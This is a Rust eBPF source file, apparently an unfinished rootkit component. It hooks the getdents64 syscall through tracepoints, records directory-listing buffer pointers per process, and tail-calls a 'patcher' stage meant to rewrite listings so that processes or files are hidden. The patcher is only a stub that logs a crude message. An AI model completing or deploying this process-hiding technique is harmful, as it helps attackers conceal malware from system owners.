#![no_std]
#![no_main]

use core::mem::offset_of;

use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_get_current_task, bpf_probe_read_kernel},
    macros::{map, tracepoint},
    maps::HashMap,
    maps::ProgramArray,
    programs::TracePointContext,
};
use aya_log_ebpf::info;

use vmlinux::vmlinux::{linux_dirent64, task_struct};

#[path = "./vmlinux/mod.rs"]
mod vmlinux;

const PROG_HANDLER: u32 = 0;
const PROG_PATCHER: u32 = 1;
const trarget_ppid: i32 = 4309;

#[map]
static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
#[allow(non_upper_case_globals)]
#[map]
static map_buffs: HashMap<u64, u64> = HashMap::<u64, u64>::with_max_entries(8192, 0);

#[tracepoint]
pub fn hide_me(ctx: TracePointContext) -> u32 {
    handle_getdents_enter(ctx).unwrap_or_else(|ret| ret)
}

fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
    let pid_tgid = bpf_get_current_pid_tgid();

    if pid_tgid != 0 {
        let ppid = unsafe {
            let task = bpf_get_current_task() as *const task_struct;

            let real_parent = bpf_probe_read_kernel::<*const task_struct>(
                (task as usize + offset_of!(task_struct, real_parent)) as *const *const task_struct,
            );

            bpf_probe_read_kernel::<i32>(
                (real_parent.unwrap() as usize + offset_of!(task_struct, tgid)) as *const i32,
            )
                .unwrap()
        };

        // if ppid != trarget_ppid {
        //     return Ok(0);
        // }
    }


    let pid = pid_tgid >> 32;
    // field:unsigned int fd;  offset:16;      size:8; signed:0;
    // field:struct linux_dirent64 * dirent;   offset:24;      size:8; signed:0;
    // field:unsigned int count;       offset:32;      size:8; signed:0;
    let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
    let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
    info!(&ctx, "pid is {}, fd is {}, buff_count is 0x{:x}", pid, fd, buff_count);


    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
    map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
    info!(&ctx, "dirp is 0x{:x}", dirp as u64);
    Ok(0)
}

#[tracepoint]
fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
    info!(&ctx, "hello");
    unsafe {
        if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
            return Ok(0);
        };
    }
    Ok(0)
}

#[tracepoint]
fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
    info!(&ctx, "fuck you");
    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
